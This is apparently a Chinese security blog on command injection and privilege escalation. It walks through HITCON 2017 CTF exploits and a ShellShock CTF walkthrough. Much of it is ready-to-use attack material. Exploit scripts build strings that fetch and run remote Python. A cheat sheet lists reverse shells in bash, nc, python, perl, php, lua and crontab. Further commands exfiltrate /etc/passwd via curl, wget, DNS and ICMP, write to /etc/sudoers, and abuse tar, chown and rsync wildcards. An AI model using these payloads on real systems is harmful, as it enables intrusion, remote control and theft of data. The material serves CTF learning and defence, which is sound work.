从图中我们就可以看到_里面的内容，第一行无效命令，2-5行因为末尾有\\连接字符的存在所以可以连接字符串形成ls -t&gt;g，最后一行执行ls。所以sh _我们可以得到当前目录ls -t&gt;g的效果。达到与Example 1一致的效果，其他步骤与Example 1类似，就不再赘述了。下面给出Orange的exp 123456789101112131415161718192021222324252627282930313233343536import requestsfrom time import sleepfrom urllib import quotepayload = [ # generate `ls -t&gt;g` file '&gt;ls\\\\', 'ls&gt;_', '&gt;\\ \\\\', '&gt;-t\\\\', '&gt;\\&gt;g', 'ls&gt;&gt;_', # generate `curl orange.tw.tw&gt;python` # curl shell.0xb.pw|python '&gt;on', '&gt;th\\\\', '&gt;py\\\\', '&gt;\\|\\\\', '&gt;pw\\\\', '&gt;x.\\\\', '&gt;xx\\\\', '&gt;l.\\\\', '&gt;el\\\\', '&gt;sh\\\\', '&gt;\\ \\\\', '&gt;rl\\\\', '&gt;cu\\\\', # exec 'sh _', 'sh g', ]# r = requests.get('http://localhost/tmp/?reset=1')for i in payload: assert len(i) &lt;= 5 r = requests.get('http://localhost/tmp/?cmd=' + quote(i) ) print i sleep(0.2) 相关Writeup: HITCON CTF 2017-BabyFirst Revenge-writeup HITCON CTF 2017-BabyFirst Revenge-writeup (Via curl) HITCON 2017 CTF BabyFirst Revenge HITCON CTF 2017 - BabyFirst Revenge (172 pts.) Hitcon CTF 2017 - Baby Revenge Hitcon CTF 2017 Quals: Baby First Revenge (web 172) (Via xxd) HITCON CTF 2017 BabyFirst Revenge &amp; v2 writeup BabyFirst-Revenge-HITCOIN-2017-QUALS by @n4p5ter Example 3 四字绕过 [HITCON 2017 BabyFirst Revenge v2]源码： 1234567891011&lt;?php $sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 4) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__);?&gt; 这题相比之前又难了一点，这次是cmd &lt;= 4，但是原理还是一样的。我们要处理的问题还是ls -t&gt;g这么一个问题。然后因为长度限制，如果我们还用\\\\作为字符串连接的话，只剩下两个字符，加上最开始必须要用&gt;创建文件，所以只剩下一个可控字符。所以碰到需要转义空格这种地方例如Exmaple 2中的&gt;\\ \\\\这里就不能再使用了。但是我们这里再提一个trick * 相当于$(dir *),所以说如果文件名如果是命令的话就会返回执行的结果,之后的作为参数传入。例如： 所以回到题目，如果按照顺序去创建文件，我们会发现如果直接用*去执行的话，发现并不可以，因为按照dir的文件排序，-t也是排在最前面。 所以我们还需要参考一下alphabetical来排序，这里就不要用Docker来做了，因为busybox里面一些东西还是跟真实环境优点区别的。 所以如果我们需要运用-字符的话，他会排在最前面，这里就比较坑了。所以我们需要想个办法把-t置于后面。 这里我们可以使用t-这种逆序的模式把t放到前面来，就可以比较正常的排序了。 逆序的命令我们可以用rev来实现，另外我们还需要一个字母比较靠前的命令来展示当前目录，我们可以采用dir来展示当前目录，同时d字母也比较靠前，不要像ls特别考虑排序的问题。所以我们大概可以通过这么一个形式去构造ls -t&gt;g 这里可能有几个让大家比较疑惑的地方，比如为什么是&gt;ht-，个人理解是因为ls逆序是sl，s是排在t前的，如果不加h，t-会在sl之后，而且ls -th与ls -t效果是一样的，然后我们再找一个h之前的字母做输出文件就可以了。还有一个地方就是*v&gt;x，之前我们讲过了通配符以及*的作用，这里*v就相当于$(dir *v)&gt;x，dir *v返回的就是结尾为v的文件，这里就是rev与v两个文件，如果只有相当于先把v文件内容进行逆序，而后再输入到x文件，这样整个ls -t&gt;g的命令拼凑就完成了，接着方法就有很多种了，比较简单的就是直接wget或者curl一个webshell到服务器上就好了，就不再赘述了。 再给一个Orange的exp 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsfrom time import sleepfrom urllib import quotepayload = [ # generate \"g&gt; ht- sl\" to file \"v\" '&gt;dir', '&gt;sl', '&gt;g\\&gt;', '&gt;ht-', '*&gt;v', # reverse file \"v\" to file \"x\", content \"ls -th &gt;g\" '&gt;rev', '*v&gt;x', # generate \"curl orange.tw|python;\" '&gt;\\;\\\\', '&gt;on\\\\', '&gt;th\\\\', '&gt;py\\\\', '&gt;\\|\\\\', '&gt;tw\\\\', '&gt;e.\\\\', '&gt;ng\\\\', '&gt;ra\\\\', '&gt;o\\\\', '&gt;\\ \\\\', '&gt;rl\\\\', '&gt;cu\\\\', # got shell 'sh x', 'sh g', ]r = requests.get('http://52.197.41.31/?reset=1')for i in payload: assert len(i) &lt;= 4 r = requests.get('http://52.197.41.31/?cmd=' + quote(i) ) print i sleep(0.1) 相关Writeup: Baby First Revenge v2 (Via vim) by @bennofs [python] baby-exp.py How to solve a CTF challenge for $20 - HITCON 2017 BabyFirst Revenge v2 HITCON CTF 2017 BabyFirst Revenge &amp; v2 writeup 无回显的命令注入我们之前提到的大部分都是有回显或者一部分提示的命令注入，当我们遇到无回显的命令注入的时候我们又要怎么办呢？ DNS Log项目地址：BugScanTeam/DNSLog 对于一些命令盲注类的漏洞，这通常是比较有效的方法，因为通常出站DNS流量不会被阻止可以通过，DNSLog 中的 WebLog 部分将其转化为有回显的命令执行： 1curl \"http://testhash.test.dnslog.link/?`whoami`\" 这个用起来比较简单，直接去查看对应的记录就好了。 有时候你需要编码想要读出来的内容，这样才不会由于一些空格或者什么其他字符导致读不完整数据。 这里不仅可以用于命令注入，还可以用于xss等其他一些无回显的攻击。 这里再给个走udp流量的示例 123Only OB DNS traffic (UDP/53) allowed and can exec commands? Use dig `cut -d: -s -f1 /etc/passwd | sed 10\\!d` @ipto offload file contents. 服务端： 1nc -l -n -vv -p 53 -u -k(如果不支持-k也可以不用-k) Same: 1{dig,`{cut,-d:,-s,-f1,/etc/passwd}|{sed,2\\!d}`,@ip} sleep检测是否有命令注入比较好的方式就是使用sleep，并观察其执行时间是否增加。 123456789$ time ruby ping.rb '8.8.8.8'PING 8.8.8.8 (8.8.8.8): 56 data bytes...0.09s user 0.04s system 4% cpu 3.176 total$ time ruby ping.rb '8.8.8.8 &amp;&amp; sleep 5'PING 8.8.8.8 (8.8.8.8): 56 data bytes...0.10s user 0.04s system 1% cpu 8.182 total 可以看出如果存在命令注入，执行时间会按照我们sleep的参数增加，我们这里再简单总结一下前面单引号与双引号的区别，以下都需要去掉反斜杠（主题有点怪 命令 结果 ping -c 4 8.8.8.8 \\`sleep 5\\` sleep命令被执行，命令替换在命令行中。 ping -c 4 \"8.8.8.8 \\`sleep 5\\`\" sleep命令被执行，命令替换在复杂的字符串双引号之间。 ping -c 4 $(echo 8.8.8.8 \\`sleep 5\\`) sleep命令被执行，命令替换在使用不同符号时。 ping -c 4 '8.8.8.8 \\`sleep 5\\`' sleep命令不执行，命令替换在简单字符串中不起作用（单引号之间）。 ping -c 4 \\`echo 8.8.8.8 \\`sleep 5\\`\\` sleep命令不执行，使用相同符号时命令替换不起作用。 ping -c 4 8.8.8.8;sleep 5 sleep命令被执行，命令在命令行中顺序执行。 ping -c 4 “8.8.8.8;sleep 5” sleep命令未被执行，附加命令被注入到一个字符串中，该字符串作为参数传递给ping命令。 ping -c 4 $(echo 8.8.8.8;sleep 5) sleep命令被执行，排序命令在命令替换中起作用。 ping -c 4 ‘8.8.8.8;sleep 5’ sleep命令未被执行， 附加命令被注入到一个字符串中，该字符串作为参数传递给ping命令。 ping -c 4 `echo 8.8.8.8;sleep 5` sleep命令被执行，排序命令在命令替换中起作用。 ping -c 4 8.8.8.8 | sleep 5 sleep命令被执行，管道输出在命令行正常执行。 ping -c 4 “8.8.8.8 | sleep 5” sleep命令未被执行，附加命令被注入到一个字符串中，该字符串作为参数传递给ping命令。 ping -c 4 $(echo 8.8.8.8 | sleep 5) sleep命令被执行，管道输出在命令替换中起作用。 ping -c 4 ‘8.8.8.8 | sleep 5’ sleep命令未被执行，附加命令被注入到一个字符串中，该字符串作为参数传递给ping命令。 ping -c 4 `echo 8.8.8.8 | sleep 5` sleep命令被执行，管道输出在命令替换中起作用。 除了探测是否有命令注入之外，sleep还有一个可以用于命令盲注的方法。 1sleep $(hostname | cut -c 1 | tr a 5) 我们执行的命令为hostname。我们假设它返回hacker.local。 它需要输出并将其传递给cut -c 1。这将选取hacker.local的第一个字符h。 接着通过tr命令将字符a替换为5。 然后将tr命令的输出传递给sleep命令，sleep h被执行将会立即出现报错，这是因为sleep后跟的参数智能为一个数字。然后，目标使用tr命令迭代字符。执行sleep $(hostname | cut -c 1 | tr h 5)命令，将需要5秒钟的时间。这样我们就可以确定第一个字符是一个h。以此类推，我们就能将完整的主机名猜解出来。 当然，这个利用条件可能对网络环境要求比较高，但是依靠响应时间的相对时间来判断，也还是比较容易判断的，测试示例： 命令 时间 结果 ruby server-online.rb ‘8.8.8.8;sleep $(hostname | cut -c 1 | tr a 5)’ 3s – ruby server-online.rb ‘8.8.8.8;sleep $(hostname | cut -c 1 | tr h 5)’ 8s h ruby server-online.rb ‘8.8.8.8;sleep $(hostname | cut -c 2 | tr a 5)’ 8s a ruby server-online.rb ‘8.8.8.8;sleep $(hostname | cut -c 3 | tr a 5)’ 3s – ruby server-online.rb ‘8.8.8.8;sleep $(hostname | cut -c 3 | tr c 5)’ 8s c 如果想要知道目标主机名的长度，我们可以将主机名的输出通过管道符传递给wc -c命令。hacker.local为12个字符。hostname命令返回主机名和一个新行，因此wc -c将显示13个字符。经过我们测试，脚本的执行时间最短需要3秒钟。 123$ time ruby server-online.rb '8.8.8.8 &amp;&amp; sleep $(hostname | wc -c)'yes0.10s user 0.04s system 0% cpu 16.188 total 可以看到以上的payload脚本共用时16秒才执行完成，这意味着主机名为12个字符：16 – 3 (原时间) – 1 (新行) = 12个字符。当在Web服务器上执行此payload时，输出结果可能会有所不同：当请求由不同的服务器处理时，主机名的长度也可能会改变。 本次NUAACTF我也是从这里出了一个点，强迫使用sleep $(xxx)来读取flag。 使用暴露的服务在服务器上执行端口扫描，并且基于暴露的服务确定提取输出的方式。 FTP：尝试将文件写入可以从中下载文件的目录。 SSH：尝试将命令的输出写入MOTD banner，然后只需SSH到服务器。 Web：尝试将命令的输出写入公共目录（/var/www/）中。 反弹shell不过无论怎么玩，还是直接弹回一个shell来最实用，于是可以有 bash方式 1bash -c \"sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1\" exec方式 123$ exec 5&lt;&gt;/dev/tcp/ip/port$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done nc方式 本机运行 1nc -l -vv -p port 目标主机 1nc -e /bin/bash ip port 另一种nc方式 1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f 或者 1mknod backpipe p &amp;&amp; nc ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe 或者 1/bin/sh | nc 受害者ip port #这个比较特殊,需要在你自己的机器上运行 python方式 1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 另一种 1python -c \"exec(\\\"import socket, subprocess;s = socket.socket();s.connect(('ip',port))\\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\\\")\" Perl方式 1perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};' php方式 1php -r '$sock=fsockopen(\"ip\",port);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' lua方式 12lua -e \"require('socket');require('os');t=socket.tcp();t:connect('ip','port');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');\"#需要lua socket支持，且lua5.2+不支持luasocket crontab方式 crontab -e编辑当前用户的任务，或者是写到计划任务目录，一般是 /var/spool/cron/ 目录，ubuntu是/ var/spool/cron/crontabs。文件名为用户名root等。下面命令含义是每一分钟执行一次反弹shell命令。 12SHELL=/bin/bash* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 telnet方式 1mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe msf方式有很多种，这里就不再提了。 Trick无空格： 1ping -c 4 8.8.8.8;hostname|{nc,ip,port} 使用nc将文件重定向： 靶机上 1nc -lvp port &lt; /etc/passwd 本机直接nc ip port得到文件内容 使用http协议，通过curl： 1curl http://ip:port -F a=@/etc/passwd 同样可以通过curl使用ftp协议，同理wget、telnet当然也是可以的 123wget --post-data=\"`cat /etc/passwd`\" http://ip:portwget --post-file=/etc/passwd http://ip:port 1telnet 106.14.153.173 2015 &lt; /etc/passwd 使用ICMP报文 1cat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done 更正2019/2/13，更正了文章几处错误，已更新文章内容错误处 1$(printf \"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\") #可以执行 参考Web Application Firewall (WAF) Evasion Techniques Command Injection - OWASP coomix Web 安全漏洞之 OS 命令注入 linux特殊符号大全 小密圈专题(2)-命令执行绕过 linux bash shell中，单引号、 双引号，反引号（``）的区别及各种括号的区别 由ISCC2018-Web-Ping学习命令注入 shelling HITCON CTF 2017-BabyFirst Revenge-writeup LINUX下反弹SHELL的种种方式 Linux渗透之反弹Shell命令解析 技术分析：攻击者是如何利用系统命令盲注实现“拖库”的？","link":"/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"title":"命令执行到提权","text":"​ 文章首发于先知社区：https://xz.aliyun.com/t/4309 之前在补天平台首发了巧用命令注入的N种方式，看到了有几个师傅衍生出了不同的几个后续版本，都感觉挺不错的，对我的版本进行了一些补充。本来这个总结应该算是前半部分，想写的还没写完，当时又是在考试周，原本想在考试结束后就来写后半部分，又因为各种事给推掉了。所以现在来写后半部分提升篇，也算是对前半部分的补充与解释。 [TOC] 提权这里我们讲讲在命令注入中更有意思的一种方法。 Wildcard WildernessExample 1首先我们先看一个示例 123echo \"Hello Friends\" &gt; file1echo \"This is wildcard Injection\" &gt;file2echo \"take help\" &gt; --help 首先创建几个文件，其中有一个是--help，然后使用cat命令读取文件内容 123cat file1cat file 2cat --help 如果按照我们预期的，是不是在第三个cat --help处应该是要读取—help文件的内容呢？然而我们执行cat —help却优先执行了cat命令的帮助选项，并没有读出—help里的内容。 不仅是cat，ls等命令也会优先调用内置--help选项。 以及还有--all选项。 其实讲道理，词法分析把对诸如--help、--all等选项优先处理为内置选项输出，看起来并没有任何问题 这个技巧叫做Wildcard wildness，中文有人译为通配符在野。(-all、--help可以通过加入./成./-all、./--help来特指这个文件，避免这个问题) Example 2 如图，我们有两个文件，当用rm *的时候，只删掉了file1与file2，并没有删除* 或者使用rm file1 file2 -rf逐个删除之时，也只删掉了file1与file2 使用strace rm *我们可以发现 由于当前目录中存在-rf文件名，rm将-rf选项作为最后一个参数，并且递归删除当前目录中的所有文件。同样，若要删除可以加上./-rf进行删除 Trick我们可以利用Wildcard Wilderness做一些更有用的事情。 File Owner Hijacking现在我们有三个用户，一个zedd，一个test，一个root用户。 我们分别用zedd与test创建了不同的文件，1.php与test.php都属于test用户的文件，zedd.php与--reference=zedd.php均属于zedd用户的文件。 然后使用root用户使用chown -R test:test *.php命令，想把本目录下所有的.php文件修改为test用户所有。 但是结果我们可以发现，结果该目录下所有的.php文件都被修改为了zedd用户所有，成功“提权”。 原理我们可以用strace chown -R zedd:zedd *.php来看一下（注意这里换了一下，模拟想把.php文件改变成zedd用户所有） 我们可以看到 1execve(\"/bin/chown\", [\"chown\", \"-R\", \"zedd:zedd\", \"config.php\", \"index.php\", \"--reference=.backdoor.php\"], 0x7ffe5b43b1e8 /* 35 vars */) = 0 跟我们上个例子原理其实一样，--reference=.backdoor.php被作为一个选项进行了处理，而 12--reference=RFILE use RFILE's owner and group rather than specifying OWNER:GROUP values --reference=RFILE这个选项则是使用RFILE的文件拥有者和用户组来改变文件属性，而不是使用传入的OWNER:GROUP参数。 因此，在这种情况下，chown的--reference选项将覆盖指定为root用户输入的参数zedd:zedd，把此目录中所有.php文件的所有者改变与.backdoor.php的所有者test。 所以，按照这种方法，我们可以劫持root将文件的所有权更改为任意用户，并“劫持”我们想要的文件。 Chmod File Reference类似chown的还有一个命令chmod，它也有--reference=RFIE的选项 1--reference=RFILE use RFILE's mode instead of MODE values 与chown类似，因为有--reference=.backdoor.php的存在，在使用chmod 000 *的时候也会把劫持到与.backdoor.php文件权限一样的权限 Tar命令利用首先我们来看看tar命令帮助文档中的几个有意思的选项 1234--checkpoint[=NUMBER] truedisplay progress messages every NUMBERth record (default 10)--checkpoint-action=ACTION trueexecute ACTION on each checkpoint 从帮助文档，我们大致可以从中理解到，--checkpoint=1可以用来显示信息，--checkpoint-action=exec=sh shell.sh可以用来执行命令 先尝试构建一个shell.sh脚本，内容为/usr/bin/id，以及文件名为--checkpoint=1与--checkpoint-action=exec=sh shell.sh的文件，使用tar -cf test.tar *把当前目录下所有文件压缩到test.tar压缩包内 可见，/usr/bin/id已经被成功执行输出。 与之前一样，--checkpoint=1与--checkpoint-action=exec=sh shell.sh被作为选项处理 在 2018 SWPUCTF 上有一道 web 题考点也正是利用了这个点，由于题目官方没有开源，这里给一个比较详细的 @一叶飘零 师傅写的 wp 用于参考学习: 2018SWPUCTF-Web#信息再次发掘 rsync命令利用rsync命令可能比较少用，我们这里简单介绍一下 NAME ​ rsync - a fast, versatile, remote (and local) file-copying tool rsync命令是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。使用一个远程shell程序(如rsh、ssh)来实现将本地机器的内容拷贝到远程机器。如：rsync -t *.c foo:src，复制当前本地文件夹下的所有的.c文件到 foo 远程服务器的/src文件夹下。 rsync帮助文档含有以下几个比较有意思的选项 12-e, --rsh=COMMAND specify the remote shell to use --rsync-path=PROGRAM specify the rsync to run on remote machine --rsh=COMMAND又是一个我们可以利用的地方，我们首先创建一个文件名为-e sh shell.c的文件，然后再创建一个shell.c文件，污染rsync参数来实现执行我们在shell.c中写入的预期命令 假设当前目录下我们拥有一个只有root用户可读的rootfile文件，由于不能直接输出结果，我们可以构造cat ./rootfile &gt; ./output，将文件内容读出。 得到的output文件是 644 的权限，这样我们就成功构造了一个提权读取的文件的 payload ，这里可能需要注意的是，只能提取到执行rsync用户的权限，不是直接的root权限，这里因为执行命令的是root权限，所以能读取只有root用户才能读取的rootfile文件 Tips 既然能执行命令，其实我们可以参照上篇列举的反弹 shell 的方式将 shell 反弹给我们，也可以配合msfvenom来使用。 tar命令比较多的都用在/etc/crontab计划任务中，经常会有管理员会用crontab来执行一些tar命令的备份操作，而且crontab执行的权限还是root权限，所以这是个很好利用的点 tar命令需要进入到--checkpoint=1文件所在的目录内，如果加上绝对路径将会失效，例如tar cf test.tar /var/www/html/* 我们可以看到 shell 处理方式将/home/zedd/Desktop/test与目录下的文件名逐个拼接起来，就达不到污染参数的效果了 还可以用echo \"zedd ALL=(root) NOPASSWD: ALL\" &gt; /etc/sudoers，把自己直接写入管理员组 利用chmod u+s /usr/bin/find提升为root权限执行，配合find命令的-exec COMMAND来执行命令，例如find f1 -exec \"whoami\" \\; 文章中讨论的技术可以以不同的形式在各种流行的Unix工具上应用，这里仅仅是抛砖引玉，列举一部分命令。 在实际攻击中，任意 shell 选项/参数都可以隐藏在常规文件中，管理员也不容易发现，比如使用.backdoor.php等形式。 Other这里讲讲几个虽然不属于提权，但是也比较有意思的几个点。 Echoecho *可以用来显示目录，echo /???g可以用来探测文件 ln NAME ​ ln - make links between files ln命令常常用于链接两个文件，而且分两种链接模式，一种硬链接一种软链接，详细可以参考理解Linux硬链接与软链接。这里主要讲讲软链接，软链接相当于我们 Windows 中的快捷方式，可以使用ln -s创建 例如，这里我们根目录下有一个文件内容为flag{xxx}的名为flag文件，我们使用ln -s /flag file，在当前目录下创建一个file文件链接到/flag，使用cat file与php -r \"echo file_get_contents('file')\"均可以读取到/flag的内容。 这个软链接读取文件内容已经被多次利用 在 GitLab CVE-2016-9086 也是利用了这点，参考GitLab 任意文件读取漏洞 (CVE-2016-9086) 和任意用户 token 泄露漏洞 CTF 中也出现了类似的题目，参考一个有趣的任意文件读取，以及在 2018 年赛博地球杯上有一道题也是利用这个点，参考记录一道题的多种解法，“赛博地球杯”工业互联网安全大赛线上赛Writeup ShellShock(CVE-2014-6271)Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的 shell 命令，甚至完全控制目标系统，详细分析参考破壳（ShellShock）漏洞样本分析报告 CVE-2014-6271 测试方式: env x=’() { :;}; echo vulnerable’ bash -c “echo this is a test” CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过)env -i X=’;() { (a)=&gt;' bash -c ‘echo date’; cat echo 从一道题看Shell Shock题目地址：command-executor——来源于 HackMe 题目描述： ​ Here’s my useless developer assistant website, try to execute your own command! 题目大体思路是： 读取源码 Shell Shock命令执行 重定向读写文件 题目设置为几个功能，一个man命令的帮助文档 选择了ls，多了个请求参数file=ls 尝试用其他命令，比如find 猜测eval(\"man /bin/\" + command)或者一些其他的目录 Tar Tester界面可以上传压缩包但是并没有解压，只是tar -tvf test.tar查看压缩包内的内容 Cmd Exec界面只有两个命令，一个ls，一个env List files是个目录列举界面，可以列举几个目录 观察题目，题目 urlhttps://command-executor.hackme.inndy.tw/index.php?func=untar等均带有func=xxx参数来展示页面，猜测会有文件包含漏洞，尝试使用func=php://filter/read=convert.base64-encode/resource=index读取文件内容，成功得到回显 解码得到 index.php源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&lt;?php$pages = [ ['man', 'Man'], ['untar', 'Tar Tester'], ['cmd', 'Cmd Exec'], ['ls', 'List files'],];function fuck($msg) { header('Content-Type: text/plain'); echo $msg; exit;}$black_list = [ '\\/flag', '\\(\\)\\s*\\{\\s*:;\\s*\\};'];function waf($a) { global $black_list; if(is_array($a)) { foreach($a as $key =&gt; $val) { waf($key); waf($val); } } else { foreach($black_list as $b) { if(preg_match(\"/$b/\", $a) === 1) { fuck(\"$b detected! exit now.\"); } } }}waf($_SERVER);waf($_GET);waf($_POST);function execute($cmd, $shell='bash') { system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));}foreach($_SERVER as $key =&gt; $val) { if(substr($key, 0, 5) === 'HTTP_') { putenv(\"$key=$val\"); }}$page = '';if(isset($_GET['func'])) { $page = $_GET['func']; if(strstr($page, '..') !== false) { $page = ''; }}if($page &amp;&amp; strlen($page) &gt; 0) { try { include(\"$page.php\"); } catch (Exception $e) { }}function render_default() { ?&gt;&lt;p&gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.&lt;/p&gt;&lt;img src=\"windows-run.jpg\" alt=\"command executor\"&gt;&lt;?php }?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Command Executor&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"bootstrap/css/bootstrap.min.css\" media=\"all\"&gt; &lt;link rel=\"stylesheet\" href=\"comic-neue/font.css\" media=\"all\"&gt; &lt;style&gt; nav { margin-bottom: 1rem; } img { max-width: 100%; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=\"navbar navbar-expand-lg navbar-dark bg-dark d-flex\"&gt; &lt;a class=\"navbar-brand\" href=\"index.php\"&gt;Command Executor&lt;/a&gt; &lt;ul class=\"navbar-nav\"&gt;&lt;?php foreach($pages as list($file, $title)): ?&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"index.php?func=&lt;?=$file?&gt;\"&gt;&lt;?=$title?&gt;&lt;/a&gt; &lt;/li&gt;&lt;?php endforeach; ?&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;div class=\"container\"&gt;&lt;?php if(is_callable('render')) render(); else render_default(); ?&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; man.php源码： 123456789101112131415161718192021222324252627282930&lt;?phpfunction render() { $file = 'man'; if(isset($_GET['file'])) { $file = (string)$_GET['file']; if(preg_match('/^[\\w\\-]+$/', $file) !== 1) { echo '&lt;pre&gt;Invalid file name!&lt;/pre&gt;'; return; } } echo '&lt;h1&gt;Online documents&lt;/h1&gt;'; $cmds = [ 'bash', 'ls', 'cp', 'mv' ]; echo '&lt;ul&gt;'; foreach($cmds as $cmd) { printf('&lt;li&gt;&lt;a href=\"index.php?func=man&amp;file=%s\"&gt;%1$s&lt;/a&gt;&lt;/li&gt;', $cmd); } echo '&lt;/ul&gt;'; printf('&lt;h2&gt;$ man %s&lt;/h2&gt;', htmlentities($file)); echo '&lt;pre&gt;'; execute(sprintf('man %s | cat', escapeshellarg($file))); echo '&lt;/pre&gt;';}?&gt; untar.php源码： 1234567891011121314151617181920212223&lt;?phpfunction render() {?&gt;&lt;h1&gt;Tar file tester&lt;/h1&gt;&lt;p&gt;Please upload a tar file to test&lt;/p&gt;&lt;form enctype=\"multipart/form-data\" action=\"index.php?func=untar\" method=\"POST\"&gt; &lt;input type=\"file\" name=\"tarfile\" id=\"tarfile\"&gt; &lt;input class=\"btn btn-primary\" type=\"submit\" value=\"Upload &amp;amp; Test\"&gt;&lt;/form&gt;&lt;?php if(isset($_FILES['tarfile'])) { printf('&lt;h2&gt;$ tar -tvf %s&lt;/h2&gt;', htmlentities($_FILES['tarfile']['name'])); echo '&lt;pre&gt;'; execute(sprintf('tar -tvf %s 2&gt;&amp;1', escapeshellarg($_FILES['tarfile']['tmp_name']))); echo '&lt;/pre&gt;'; }}?&gt; ls.php源码： 1234567891011121314151617181920212223&lt;?phpfunction render() { $file = '.'; if(isset($_GET['file'])) { $file = (string)$_GET['file']; } echo '&lt;h1&gt;Dictionary Traversal&lt;/h1&gt;'; echo '&lt;ul&gt;'; $dirs = ['.', '..', '../..', '/etc/passwd']; foreach($dirs as $dir) { printf('&lt;li&gt;&lt;a href=\"index.php?func=ls&amp;file=%s\"&gt;%1$s&lt;/a&gt;&lt;/li&gt;', $dir); } echo '&lt;/ul&gt;'; printf('&lt;h2&gt;$ ls %s&lt;/h2&gt;', htmlentities($file)); echo '&lt;pre&gt;'; execute(sprintf('ls -l %s', escapeshellarg($file))); echo '&lt;/pre&gt;';}?&gt; cmd.php源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpfunction render() { $cmd = ''; if(isset($_GET['cmd'])) { $cmd = (string)$_GET['cmd']; }?&gt;&lt;h1&gt;Command Execution&lt;/h1&gt;&lt;?php echo '&lt;ul&gt;'; $cmds = ['ls', 'env']; foreach($cmds as $c) { printf('&lt;li&gt;&lt;a href=\"index.php?func=cmd&amp;cmd=%s\"&gt;%1$s&lt;/a&gt;&lt;/li&gt;', $c); } echo '&lt;/ul&gt;';?&gt;&lt;form action=\"index.php\" method=\"GET\"&gt; &lt;input type=\"hidden\" name=\"func\" value=\"cmd\"&gt; &lt;div class=\"input-group\"&gt; &lt;input class=\"form-control\" type=\"text\" name=\"cmd\" id=\"cmd\"&gt; &lt;div class=\"input-group-append\"&gt; &lt;input class=\"btn btn-primary\" type=\"submit\" value=\"Execute\"&gt; &lt;/div&gt; &lt;/div&gt;&lt;/form&gt;&lt;script&gt;cmd.focus();&lt;/script&gt;&lt;?php if(strlen($cmd) &gt; 0) { printf('&lt;h2&gt;$ %s&lt;/h2&gt;', htmlentities($cmd)); echo '&lt;pre&gt;'; switch ($cmd) { case 'env': case 'ls': case 'ls -l': case 'ls -al': execute($cmd); break; case 'cat flag': echo '&lt;img src=\"cat-flag.png\" alt=\"cat flag\"&gt;'; break; default: printf('%s: command not found', htmlentities($cmd)); } echo '&lt;/pre&gt;'; }}?&gt; 接下来我们就可以利用ls.php来找flag了，因为ls.php没什么过滤，所以用func=ls&amp;file=../../../可以发现根目录下的文件 接下来就是考虑怎么去读了，man.php因为有preg_match('/^[\\w\\-]+$/', $file) !== 1限制得比较死，untar.php貌似只有tar -tvf并没有什么用处，只有cmd.php给出了一个比较不太寻常的env这个命令，其实这样也算是提示得比较明显了，比较容易让人想到也可以比较容易搜到ShellShock漏洞，并且在index.php中发现有 1234567891011121314151617181920212223242526272829$black_list = [ '\\/flag', '\\(\\)\\s*\\{\\s*:;\\s*\\};'];function waf($a) { global $black_list; if(is_array($a)) { foreach($a as $key =&gt; $val) { waf($key); waf($val); } } else { foreach($black_list as $b) { if(preg_match(\"/$b/\", $a) === 1) { fuck(\"$b detected! exit now.\"); } } }}waf($_SERVER);waf($_GET);waf($_POST);foreach($_SERVER as $key =&gt; $val) { if(substr($key, 0, 5) === 'HTTP_') { putenv(\"$key=$val\"); }} 关键就在putenv函数，由于ShellShock漏洞 padyload 需要参数 1env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\" 我们就可以利用putenv实现参数传递，直接设置User-agent: () { :;}; echo 222222，发现被 waf 分析 waf 结合漏洞成因，我们可以在最后的};中间添加一个空格绕过，设置User-Agent: () { :;} ; 